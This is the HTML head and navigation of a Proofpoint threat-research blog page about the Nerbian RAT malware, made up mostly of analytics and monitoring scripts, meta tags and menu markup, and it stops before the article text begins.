r="string"==typeof e?new Error(e):e;throw t.emit("fn-err",[arguments,this,r],o),r}finally{t.emit("fn-end",[(0,c.t)()],o)}}}};["actionText","setName","setAttribute","save","ignore","onEnd","getContext","end","get"].forEach((t=>{p.apply(this,[t,function(){return(0,s.p)(u.hw+t,[(0,c.t)(),...arguments],this,e.runSoftNavOverSpa?n.K7.softNav:n.K7.spa,e.ee),this},e,i])})),p(u.PA,(function(){e.runSoftNavOverSpa?(0,s.p)(u.hw+"routeName",[performance.now(),...arguments],void 0,n.K7.softNav,e.ee):(0,s.p)(u.Pl+"routeName",[(0,c.t)(),...arguments],this,n.K7.spa,e.ee)}),e)}class We extends T{static featureName=Ue.TZ;constructor(e){if(super(e,Ue.TZ),Fe(e),!y.RI||!(0,_.dV)().o.MO)return;const t=Se(this.ee);Ue.tC.forEach((e=>{(0,O.sp)(e,(e=>{a(e)}),!0)}));const r=()=>(0,s.p)("newURL",[(0,c.t)(),""+window.location],void 0,this.featureName,this.ee);t.on("pushState-end",r),t.on("replaceState-end",r);try{this.removeOnAbort=new AbortController}catch(e){}(0,O.sp)("popstate",(e=>(0,s.p)("newURL",[e.timeStamp,""+window.location],void 0,this.featureName,this.ee)),!0,this.removeOnAbort?.signal);let n=!1;const o=new((0,_.dV)().o.MO)(((e,t)=>{n||(n=!0,requestAnimationFrame((()=>{(0,s.p)("newDom",[(0,c.t)()],void 0,this.featureName,this.ee),n=!1})))})),a=(0,x.s)((e=>{(0,s.p)("newUIEvent",[e],void 0,this.featureName,this.ee),o.observe(document.body,{attributes:!0,childList:!0,subtree:!0,characterData:!0})}),100,{leading:!0});this.abortHandler=function(){this.removeOnAbort?.abort(),o.disconnect(),this.abortHandler=void 0},this.importAggregator(e,(()=>i.e(478).then(i.bind(i,4393))),{domObserver:o})}}var Be=i(7378);const Ge={},Ve=["appendChild","insertBefore","replaceChild"];function ze(e){const t=function(e){return(e||ee.ee).get("jsonp")}(e);if(!y.RI||Ge[t.debugId])return t;Ge[t.debugId]=!0;var r=(0,te.YM)(t),n=/[?&](?:callback|cb)=([^&#]+)/,i=/(.*)\.([^.]+)/,o=/^(\w+)(\.|$)(.*)$/;function a(e,t){if(!e)return t;const r=e.match(o),n=r[1];return a(r[3],t[n])}return r.inPlace(Node.prototype,Ve,"dom-"),t.on("dom-start",(function(e){!function(e){if(!e||"string"!=typeof e.nodeName||"script"!==e.nodeName.toLowerCase())return;if("function"!=typeof e.addEventListener)return;var o=(s=e.src,c=s.match(n),c?c[1]:null);var s,c;if(!o)return;var u=function(e){var t=e.match(i);if(t&&t.length>=3)return{key:t[2],parent:a(t[1],window)};return{key:e,parent:window}}(o);if("function"!=typeof u.parent[u.key])return;var d={};function l(){t.emit("jsonp-end",[],d),e.removeEventListener("load",l,(0,O.jT)(!1)),e.removeEventListener("error",f,(0,O.jT)(!1))}function f(){t.emit("jsonp-error",[],d),t.emit("jsonp-end",[],d),e.removeEventListener("load",l,(0,O.jT)(!1)),e.removeEventListener("error",f,(0,O.jT)(!1))}r.inPlace(u.parent,[u.key],"cb-",d),e.addEventListener("load",l,(0,O.jT)(!1)),e.addEventListener("error",f,(0,O.jT)(!1)),t.emit("new-jsonp",[e.src],d)}(e[0])})),t}const Ze={};function qe(e){const t=function(e){return(e||ee.ee).get("promise")}(e);if(Ze[t.debugId])return t;Ze[t.debugId]=!0;var r=t.context,n=(0,te.YM)(t),i=y.gm.Promise;return i&&function(){function e(r){var o=t.context(),a=n(r,"executor-",o,null,!1);const s=Reflect.construct(i,[a],e);return t.context(s).getCtx=function(){return o},s}y.gm.Promise=e,Object.defineProperty(e,"name",{value:"Promise"}),e.toString=function(){return i.toString()},Object.setPrototypeOf(e,i),["all","race"].forEach((function(r){const n=i[r];e[r]=function(e){let i=!1;[...e||[]].forEach((e=>{this.resolve(e).then(a("all"===r),a(!1))}));const o=n.apply(this,arguments);return o;function a(e){return function(){t.emit("propagate",[null,!i],o,!1,!1),i=i||!e}}}})),["resolve","reject"].forEach((function(r){const n=i[r];e[r]=function(e){const r=n.apply(this,arguments);return e!==r&&t.emit("propagate",[e,!0],r,!1,!1),r}})),e.prototype=i.prototype;const o=i.prototype.then;i.prototype.then=function(...e){var i=this,a=r(i);a.promise=i,e[0]=n(e[0],"cb-",a,null,!1),e[1]=n(e[1],"cb-",a,null,!1);const s=o.apply(this,e);return a.nextPromise=s,t.emit("propagate",[i,!0],s,!1,!1),s},i.prototype.then[te.Jt]=o,t.on("executor-start",(function(e){e[0]=n(e[0],"resolve-",this,null,!1),e[1]=n(e[1],"resolve-",this,null,!1)})),t.on("executor-err",(function(e,t,r){e[1](r)})),t.on("cb-end",(function(e,r,n){t.emit("propagate",[n,!0],this.nextPromise,!1,!1)})),t.on("propagate",(function(e,r,n){this.getCtx&&!r||(this.getCtx=function(){if(e instanceof Promise)var r=t.context(e);return r&&r.getCtx?r.getCtx():this})}))}(),t}const Xe={},Ye="setTimeout",$e="setInterval",Je="clearTimeout",Qe="-start",et=[Ye,"setImmediate",$e,Je,"clearImmediate"];function tt(e){const t=function(e){return(e||ee.ee).get("timer")}(e);if(Xe[t.debugId]++)return t;Xe[t.debugId]=1;var r=(0,te.YM)(t);return r.inPlace(y.gm,et.slice(0,2),Ye+"-"),r.inPlace(y.gm,et.slice(2,3),$e+"-"),r.inPlace(y.gm,et.slice(3),Je+"-"),t.on($e+Qe,(function(e,t,n){e[0]=r(e[0],"fn-",null,n)})),t.on(Ye+Qe,(function(e,t,n){this.method=n,this.timerDuration=isNaN(e[1])?0:+e[1],e[0]=r(e[0],"fn-",this,n)})),t}const rt={};function nt(e){const t=function(e){return(e||ee.ee).get("mutation")}(e);if(!y.RI||rt[t.debugId])return t;rt[t.debugId]=!0;var r=(0,te.YM)(t),n=y.gm.MutationObserver;return n&&(window.MutationObserver=function(e){return this instanceof n?new n(r(e,"fn-")):n.apply(this,arguments)},MutationObserver.prototype=n.prototype),t}const{TZ:it,d3:ot,Kp:at,$p:st,wW:ct,e5:ut,tH:dt,uP:lt,rw:ft,Lc:ht}=Be;class pt extends T{static featureName=it;constructor(e){if(super(e,it),Fe(e),!y.RI)return;try{this.removeOnAbort=new AbortController}catch(e){}let t,r=0;const n=this.ee.get("tracer"),o=ze(this.ee),a=qe(this.ee),u=tt(this.ee),d=ie(this.ee),l=this.ee.get("events"),f=fe(this.ee),h=Se(this.ee),p=nt(this.ee);function g(e,t){h.emit("newURL",[""+window.location,t])}function m(){r++,t=window.location.hash,this[lt]=(0,c.t)()}function v(){r--,window.location.hash!==t&&g(0,!0);var e=(0,c.t)();this[ut]=~~this[ut]+e-this[lt],this[ht]=e}function b(e,t){e.on(t,(function(){this[t]=(0,c.t)()}))}this.ee.on(lt,m),a.on(ft,m),o.on(ft,m),this.ee.on(ht,v),a.on(ct,v),o.on(ct,v),this.ee.on("fn-err",((...t)=>{t[2]?.__newrelic?.[e.agentIdentifier]||(0,s.p)("function-err",[...t],void 0,this.featureName,this.ee)})),this.ee.buffer([lt,ht,"xhr-resolved"],this.featureName),l.buffer([lt],this.featureName),u.buffer(["setTimeout"+at,"clearTimeout"+ot,lt],this.featureName),d.buffer([lt,"new-xhr","send-xhr"+ot],this.featureName),f.buffer([dt+ot,dt+"-done",dt+st+ot,dt+st+at],this.featureName),h.buffer(["newURL"],this.featureName),p.buffer([lt],this.featureName),a.buffer(["propagate",ft,ct,"executor-err","resolve"+ot],this.featureName),n.buffer([lt,"no-"+lt],this.featureName),o.buffer(["new-jsonp","cb-start","jsonp-error","jsonp-end"],this.featureName),b(f,dt+ot),b(f,dt+"-done"),b(o,"new-jsonp"),b(o,"jsonp-end"),b(o,"cb-start"),h.on("pushState-end",g),h.on("replaceState-end",g),window.addEventListener("hashchange",g,(0,O.jT)(!0,this.removeOnAbort?.signal)),window.addEventListener("load",g,(0,O.jT)(!0,this.removeOnAbort?.signal)),window.addEventListener("popstate",(function(){g(0,r>1)}),(0,O.jT)(!0,this.removeOnAbort?.signal)),this.abortHandler=this.#r,this.importAggregator(e,(()=>i.e(478).then(i.bind(i,5592))))}#r(){this.removeOnAbort?.abort(),this.abortHandler=void 0}}var gt=i(3333);class mt extends T{static featureName=gt.TZ;constructor(e){super(e,gt.TZ);const t=[e.init.page_action.enabled,e.init.performance.capture_marks,e.init.performance.capture_measures,e.init.user_actions.enabled,e.init.performance.resources.enabled];var r;if(r=e,p(u.hG,((e,t)=>V(e,t,r)),r),function(e){p(u.fF,(function(){(0,s.p)(u.Pl+u.fF,[(0,c.t)(),...arguments],void 0,n.K7.genericEvents,e.ee)}),e)}(e),Ne(e),z(e),function(e){p(u.V1,(function(t,r){const i=(0,c.t)(),{start:o,end:a,customAttributes:d}=r||{},f={customAttributes:d||{}};if("object"!=typeof f.customAttributes||"string"!=typeof t||0===t.length)return void(0,l.R)(57);const h=(e,t)=>null==e?t:"number"==typeof e?e:e instanceof PerformanceMark?e.startTime:Number.NaN;if(f.start=h(o,0),f.end=h(a,i),Number.isNaN(f.start)||Number.isNaN(f.end))(0,l.R)(57);else{if(f.duration=f.end-f.start,!(f.duration<0))return(0,s.p)(u.Pl+u.V1,[f,t],void 0,n.K7.genericEvents,e.ee),f;(0,l.R)(58)}}),e)}(e),y.RI&&(e.init.user_actions.enabled&&(gt.Zp.forEach((e=>(0,O.sp)(e,(e=>(0,s.p)("ua",[e],void 0,this.featureName,this.ee)),!0))),gt.qN.forEach((e=>{const t=(0,x.s)((e=>{(0,s.p)("ua",[e],void 0,this.featureName,this.ee)}),500,{leading:!0});(0,O.sp)(e,t)}))),e.init.performance.resources.enabled&&y.gm.PerformanceObserver?.supportedEntryTypes.includes("resource"))){new PerformanceObserver((e=>{e.getEntries().forEach((e=>{(0,s.p)("browserPerformance.resource",[e],void 0,this.featureName,this.ee)}))})).observe({type:"resource",buffered:!0})}t.some((e=>e))?this.importAggregator(e,(()=>i.e(478).then(i.bind(i,8019)))):this.deregisterDrain()}}var vt=i(2646);const bt=new Map;function yt(e,t,r,n){if("object"!=typeof t||!t||"string"!=typeof r||!r||"function"!=typeof t[r])return(0,l.R)(29);const i=function(e){return(e||ee.ee).get("logger")}(e),o=(0,te.YM)(i),a=new vt.y(ee.P);a.level=n.level,a.customAttributes=n.customAttributes;const s=t[r]?.[te.Jt]||t[r];return bt.set(s,a),o.inPlace(t,[r],"wrap-logger-",(()=>bt.get(s))),i}var wt=i(1910);class Rt extends T{static featureName=W.TZ;constructor(e){var t;super(e,W.TZ),t=e,p(u.$9,((e,r)=>G(e,r,t)),t),function(e){p(u.Wb,((t,r,{customAttributes:n={},level:i=W.p_.INFO}={})=>{yt(e.ee,t,r,{customAttributes:n,level:i})}),e)}(e),z(e);const r=this.ee;["log","error","warn","info","debug","trace"].forEach((e=>{(0,wt.i)(y.gm.console[e]),yt(r,y.gm.console,e,{level:"log"===e?"info":e})})),this.ee.on("wrap-logger-end",(function([e]){const{level:t,customAttributes:n}=this;(0,B.R)(r,e,n,t)})),this.importAggregator(e,(()=>i.e(478).then(i.bind(i,5288))))}}new class extends r{constructor(e){var t;(super(),y.gm)?(this.features={},(0,_.bQ)(this.agentIdentifier,this),this.desiredFeatures=new Set(e.features||[]),this.desiredFeatures.add(S),this.runSoftNavOverSpa=[...this.desiredFeatures].some((e=>e.featureName===n.K7.softNav)),(0,a.j)(this,e,e.loaderType||"agent"),t=this,p(u.cD,(function(e,r,n=!1){if("string"==typeof e){if(["string","number","boolean"].includes(typeof r)||null===r)return g(t,e,r,u.cD,n);(0,l.R)(40,typeof r)}else(0,l.R)(39,typeof e)}),t),function(e){p(u.Dl,(function(t){if("string"==typeof t||null===t)return g(e,"enduser.id",t,u.Dl,!0);(0,l.R)(41,typeof t)}),e)}(this),function(e){p(u.nb,(function(t){if("string"==typeof t||null===t)return g(e,"application.version",t,u.nb,!1);(0,l.R)(42,typeof t)}),e)}(this),function(e){p(u.d3,(function(){e.ee.emit("manual-start-all")}),e)}(this),this.run()):(0,l.R)(21)}get config(){return{info:this.info,init:this.init,loader_config:this.loader_config,runtime:this.runtime}}get api(){return this}run(){try{const e=function(e){const t={};return o.forEach((r=>{t[r]=!!e[r]?.enabled})),t}(this.init),t=[...this.desiredFeatures];t.sort(((e,t)=>n.P3[e.featureName]-n.P3[t.featureName])),t.forEach((t=>{if(!e[t.featureName]&&t.featureName!==n.K7.pageViewEvent)return;if(this.runSoftNavOverSpa&&t.featureName===n.K7.spa)return;if(!this.runSoftNavOverSpa&&t.featureName===n.K7.softNav)return;const r=function(e){switch(e){case n.K7.ajax:return[n.K7.jserrors];case n.K7.sessionTrace:return[n.K7.ajax,n.K7.pageViewEvent];case n.K7.sessionReplay:return[n.K7.sessionTrace];case n.K7.pageViewTiming:return[n.K7.pageViewEvent];default:return[]}}(t.featureName).filter((e=>!(e in this.features)));r.length>0&&(0,l.R)(36,{targetFeature:t.featureName,missingDependencies:r}),this.features[t.featureName]=new t(this)}))}catch(e){(0,l.R)(22,e);for(const e in this.features)this.features[e].abortHandler?.();const t=(0,_.Zm)();delete t.initializedAgents[this.agentIdentifier]?.features,delete this.sharedAggregator;return t.ee.get(this.agentIdentifier).abort(),!1}}}({features:[xe,S,P,He,Ke,j,Z,mt,Rt,We,pt],loaderType:"spa"})})()})();</script>
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-MGR7P8X');</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-RCH7WQHVN3"></script>
<script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-RCH7WQHVN3');</script>
<script>(function(){var a=window.mutiny=window.mutiny||{};if(!window.mutiny.client){a.client={_queue:{}};var b=["identify","trackConversion"];var c=[].concat(b,["defaultOptOut","optOut","optIn"]);var d=function factory(c){return function(){for(var d=arguments.length,e=new Array(d),f=0;f<d;f++){e[f]=arguments[f]}a.client._queue[c]=a.client._queue[c]||[];if(b.includes(c)){return new Promise(function(b,d){a.client._queue[c].push({args:e,resolve:b,reject:d})})}else{a.client._queue[c].push({args:e})}}};c.forEach(function(b){a.client[b]=d(b)})}})();</script>
<script data-cfasync="false" src="https://client-registry.mutinycdn.com/personalize/client/d454424c4514a20a.js"></script>
<meta charset="utf-8" />
<meta name="description" content="Key Findings Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities. The malware, written in the Go programming language," />
<link rel="canonical" href="https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<link rel="shortlink" href="https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<link rel="image_src" href="https://www.proofpoint.com/sites/default/files/styles/metatag/public/misc/Blog_Covid19.jpg?itok=V1qwa5yy" />
<link rel="icon" href="/themes/custom/proofpoint/apps/drupal/favicon.ico" />
<link rel="mask-icon" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon.svg" />
<link rel="icon" sizes="16x16" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-16x16.png" />
<link rel="icon" sizes="32x32" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-32x32.png" />
<link rel="icon" sizes="96x96" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-96x96.png" />
<link rel="icon" sizes="192x192" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-192x192.png" />
<link rel="apple-touch-icon" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-60x60.png" />
<link rel="apple-touch-icon" sizes="72x72" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-72x72.png" />
<link rel="apple-touch-icon" sizes="76x76" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-76x76.png" />
<link rel="apple-touch-icon" sizes="114x114" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-114x114.png" />
<link rel="apple-touch-icon" sizes="120x120" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-120x120.png" />
<link rel="apple-touch-icon" sizes="144x144" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-144x144.png" />
<link rel="apple-touch-icon" sizes="152x152" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-152x152.png" />
<link rel="apple-touch-icon" sizes="180x180" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-180x180.png" />
<link rel="apple-touch-icon-precomposed" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-152x152.png" />
<link rel="apple-touch-icon-precomposed" sizes="180x180" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-180x180.png" />
<meta property="og:site_name" content="Proofpoint" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<meta property="og:title" content="Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques | Proofpoint US" />
<meta property="og:description" content="Key Findings Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities. The malware, written in the Go programming language," />
<meta property="og:image" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/misc/Blog_Covid19.jpg?itok=V1qwa5yy" />
<meta property="og:image:url" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/misc/Blog_Covid19.jpg?itok=V1qwa5yy" />
<meta property="og:image:secure_url" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/misc/Blog_Covid19.jpg?itok=V1qwa5yy" />
<meta property="article:published_time" content="2022-05-10T07:39:49-07:00" />
<meta property="article:modified_time" content="2023-05-01T02:14:14-07:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Key Findings Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities. The malware, written in the Go programming language," />
<meta name="twitter:site" content="@proofpoint" />
<meta name="twitter:title" content="Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques | Proofpoint US" />
<meta name="twitter:url" content="https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<meta name="twitter:image" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/misc/Blog_Covid19.jpg?itok=V1qwa5yy" />
<script data-cfasync="false" type="text/javascript" id="vwoCode">window._vwo_code=window._vwo_code || (function() {
      var account_id=1002484,
      version=1.3,
      settings_tolerance=2000,
      library_tolerance=2500,z
      use_existing_jquery=false,
      is_spa=1,
      hide_element='body',
      /* DO NOT EDIT BELOW THIS LINE */
      f=false,d=document,code={use_existing_jquery:function(){return use_existing_jquery},library_tolerance:function(){return library_tolerance},finish:function(){if(!f){f=true;var e=d.getElementById('_vis_opt_path_hides');if(e)e.parentNode.removeChild(e)}},finished:function(){return f},load:function(e){var t=d.createElement('script');t.fetchPriority='high';t.src=e;t.type='text/javascript';t.innerText;t.onerror=function(){_vwo_code.finish()};d.getElementsByTagName('head')[0].appendChild(t)},init:function(){window.settings_timer=setTimeout(function(){_vwo_code.finish()},settings_tolerance);var e=d.createElement('style'),t=hide_element?hide_element+'{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}':'',i=d.getElementsByTagName('head')[0];e.setAttribute('id','_vis_opt_path_hides');e.setAttribute('nonce',document.querySelector('#vwoCode').nonce);e.setAttribute('type','text/css');if(e.styleSheet)e.styleSheet.cssText=t;else e.appendChild(d.createTextNode(t));i.appendChild(e);this.load('https://dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&f='+ +is_spa+'&vn='+version);return settings_timer}};window._vwo_settings_timer = code.init();return code;}());</script>
<meta name="facebook-domain-verification" content="l349mr2tyecyl7w3a1146378lqxru1" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/proofpoint.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/RobotoCondensed-Regular-webfont.woff" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/fjalla-one-v7-latin-regular.woff" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/fjalla-one-v7-latin-regular.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/RobotoCondensed-Bold-webfont.woff" as="font" crossorigin="anonymous" />
<link rel="alternate" hreflang="en-us" href="https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<link rel="alternate" hreflang="en-gb" href="https://www.proofpoint.com/uk/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<link rel="alternate" hreflang="ja" href="https://www.proofpoint.com/jp/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />
<link rel="alternate" hreflang="en-au" href="https://www.proofpoint.com/au/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" />

    <title>Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques | Proofpoint US</title>
    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_U2lZakPEtiW2ltpQOZwIRKU09KG1GLfsUT3612lK4dU.css?delta=0&amp;language=en&amp;theme=particle&amp;include=eJxdj8EOwyAMQ3-oUQ_7ooSlDC2QKoRK-_sx7QD0FMW2nmVXFULb_X-3-qnOeSesvJ1onoLwHtSmL6pGYTi0eB3qoepscD2moCihAAtnXrIkGmd68e7DiZFtCYU31EY1WCIGau5ahv9ifKYycci6EqxlulUNyNAn7q9nxfYdBa8vlh5tIg" />
<link rel="stylesheet" media="all" href="/sites/default/files/css/css_k3QE8SCkH0cEgt3x3bxS_QGshFASH7nd2acqwz9dB9c.css?delta=1&amp;language=en&amp;theme=particle&amp;include=eJxdj8EOwyAMQ3-oUQ_7ooSlDC2QKoRK-_sx7QD0FMW2nmVXFULb_X-3-qnOeSesvJ1onoLwHtSmL6pGYTi0eB3qoepscD2moCihAAtnXrIkGmd68e7DiZFtCYU31EY1WCIGau5ahv9ifKYycci6EqxlulUNyNAn7q9nxfYdBa8vlh5tIg" />

    <script src="/sites/default/files/js/js_Jpx_2j2wosm7vfyxJUyz8MxNSpPoy8_s8ftsuBoEcWk.js?scope=header&amp;delta=0&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="https://platform-api.sharethis.com/js/sharethis.js#property=6543fd1a2398960013d900a7&amp;product=inline-share-buttons&amp;source=platform"></script>

  </head>
  <body class="path-node user-anonymous">
        <a href="#main-content" class="visually-hidden focusable">
      Skip to main content
    </a>
    <div class="limit-width-wrapper">
      
        <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
    
  

  
  
  
  


<div class="header-nav__spacer"></div>
<div class="header-nav js-is-top">
  <div class="header-nav__extra">
    <div class="header-nav__extra-wrap">
      <div class="header-nav__top-language" data-open="content:x_lng">
        <span>English: Americas</span>
      </div>
      <div class="header-nav__actions">
        <div class="header-nav__top-search" data-open="content:x_sch">
          <span>Search</span>
        </div>
        <div class="header-nav__top-login" data-open="content:x_lgn">
          <span>Login</span>
        </div>
      </div>
    </div>
  </div>
  <div class="header-nav__main">
    <div class="header-nav__main-wrap">
      <div class="header-nav__expand" data-open="home"></div>
      <ul class="header-nav__top-links">
                                            <li class="header-nav__top-link">
                <div data-open="content:platform_panel" class="header-nav__top-link-text">
                  Platform
                </div>
              </li>
                                                                  <li class="header-nav__top-link">
                <div data-open="content:products_panel" class="header-nav__top-link-text">
                  Products
                </div>
              </li>
                                                                  <li class="header-nav__top-link">
                <div data-open="content:solutions_panel" class="header-nav__top-link-text">
                  Solutions
                </div>
              </li>
                                                                                          </ul>
      <a href="/us" class="header-nav__logo">Proofpoint</a>
      <div class="header-nav__buttons">
                  

  


<a href="/us/contact" class="global-elements__cta global-elements__cta-btn global-elements__cta global-elements__cta-btn--blue global-elements__cta global-elements__cta-btn header-nav__button" >
      Contact Us
    </a>

              </div>
      <div class="header-nav__mobile-actions">
        <div class="header-nav__mobile-search" data-open="content:x_sch">Search</div>
        <div class="header-nav__mobile-menu" data-open="home"></div>
      </div>
    </div>
  </div>
</div>

<div class="header-nav__menu">
  <div class="header-nav__menu-wrapper">
    <div class="header-nav__menu-close"></div>
    <div class="header-nav__menu-pane" data-home={true}>
      <ul class="header-nav__home-links">
                              <li class="header-nav__home-link" data-open="content:platform_panel" ><span>Platform</span></li>
                                        <li class="header-nav__home-link" data-open="content:products_panel" ><span>Products</span></li>
                                        <li class="header-nav__home-link" data-open="content:solutions_panel" ><span>Solutions</span></li>
                                        <li class="header-nav__home-link" data-open="content:partners_panel" ><span>Partners</span></li>
                                        <li class="header-nav__home-link" data-open="content:resources_panel" ><span>Resources</span></li>
                                        <li class="header-nav__home-link" data-open="content:company_panel" ><span>Company</span></li>
                        </ul>
      <div class="header-nav__menu-extras">
        <div class="header-nav__menu-search" data-open="content:x_sch"><span>Search</span></div>
        <div class="header-nav__menu-login" data-open="content:x_lgn"><span>Login</span></div>
        <div class="header-nav__menu-language" data-open="content:x_lng"><span>English: Americas</span></div>
      </div>
    </div>
          <div class="header-nav__menu-pane" data-sublinks="Platform">
        <div class="header-nav__sublinks">
          <div class="header-nav__expand-title">Platform</div>
          <ul class="header-nav__expand-links">
                      </ul>
        </div>
      </div>
          <div class="header-nav__menu-pane" data-sublinks="Products">
        <div class="header-nav__sublinks">
          <div class="header-nav__expand-title">Products</div>
          <ul class="header-nav__expand-links">
                      </ul>
        </div>
      </div>
          <div class="header-nav__menu-pane" data-sublinks="Solutions">
        <div class="header-nav__sublinks">
          <div class="header-nav__expand-title">Solutions</div>
          <ul class="header-nav__expand-links">
                      </ul>
        </div>
      </div>
          <div class="header-nav__menu-pane" data-sublinks="Partners">
        <div class="header-nav__sublinks">
          <div class="header-nav__expand-title">Partners</div>
          <ul class="header-nav__expand-links">
                      </ul>
        </div>
      </div>
          <div class="header-nav__menu-pane" data-sublinks="Resources">
        <div class="header-nav__sublinks">
          <div class="header-nav__expand-title">Resources</div>
          <ul class="header-nav__expand-links">
                      </ul>
        </div>
      </div>
          <div class="header-nav__menu-pane" data-sublinks="Company">
        <div class="header-nav__sublinks">
          <div class="header-nav__expand-title">Company</div>
          <ul class="header-nav__expand-links">
                      </ul>
        </div>
      </div>
              <div class="header-nav__menu-pane" data-content="products_panel">
        <div class="header-nav__content">
                                                                                                                                                                              <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Threat Protection</div>
                                          <div class="header-nav__content-group-desc">Stop all human-centric threats with industry-leading AI and global threat intelligence.</div>
                                      </div>
                                                                              <div class="header-nav__content-link">
                                          <a href="/us/products/email-protection" class="header-nav__content-link-text">Core Email Protection</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/threat-protection" class="header-nav__content-link-text">Prime Threat Protection</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/how-to-buy" class="header-nav__content-link-text">How to Buy</a>
                                                          </div>
                                                                                                                <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Data Security &amp; Governance</div>
                                          <div class="header-nav__content-group-desc">Transform your data security and governance with a unified, omni-channel approach.</div>
                                      </div>
                                                                              <div class="header-nav__content-link">
                                          <a href="/us/products/defend-data" class="header-nav__content-link-text">Unified Data Security</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/adaptive-email-dlp" class="header-nav__content-link-text">Adaptive Email DLP</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/data-loss-prevention" class="header-nav__content-link-text">Enterprise DLP</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/insider-threat-management" class="header-nav__content-link-text">Insider Threat Management</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance" class="header-nav__content-link-text">Digital Communications Governance</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
